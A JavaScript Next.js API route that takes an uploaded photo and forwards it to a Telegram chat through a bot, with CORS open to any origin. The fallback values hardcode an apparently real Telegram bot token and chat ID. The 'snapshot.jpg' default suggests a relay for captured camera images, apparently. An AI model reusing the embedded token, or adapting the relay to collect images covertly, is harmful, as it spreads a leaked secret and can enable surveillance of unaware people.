import { IncomingForm } from "formidable";
import fs from "fs";
import FormData from "form-data";
import axios from "axios";

export const config = {
  api: { bodyParser: false },
};

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({ error: "Method not allowed" });
  }

  const TELEGRAM_TOKEN =
    process.env.TELEGRAM_TOKEN ||
    "6235375573:AAHdripMzwMYFL0dhruXGyvmJ6ZSQhWCTn4";
  const CHAT_ID = process.env.CHAT_ID || "1444862345";

  try {
    const form = new IncomingForm({ keepExtensions: true });

    const { files } = await new Promise((resolve, reject) => {
      form.parse(req, (err, fields, files) => {
        if (err) reject(err);
        else resolve({ fields, files });
      });
    });

    if (!files.photo) {
      console.log("❌ No photo received in backend:", files);
      return res.status(400).json({ error: "Photo file missing in backend" });
    }

    const photoFile = Array.isArray(files.photo) ? files.photo[0] : files.photo;

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", fs.createReadStream(photoFile.filepath), {
      filename: photoFile.originalFilename || "snapshot.jpg",
    });

    const response = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
      formData,
      { headers: formData.getHeaders() }
    );

    const data = response.data;

    if (!data.ok) {
      throw new Error(data.description);
    }

    return res.status(200).json({ success: true });
  } catch (e) {
    console.error("Telegram send error:", e);
    return res.status(500).json({ error: e.message });
  }
}
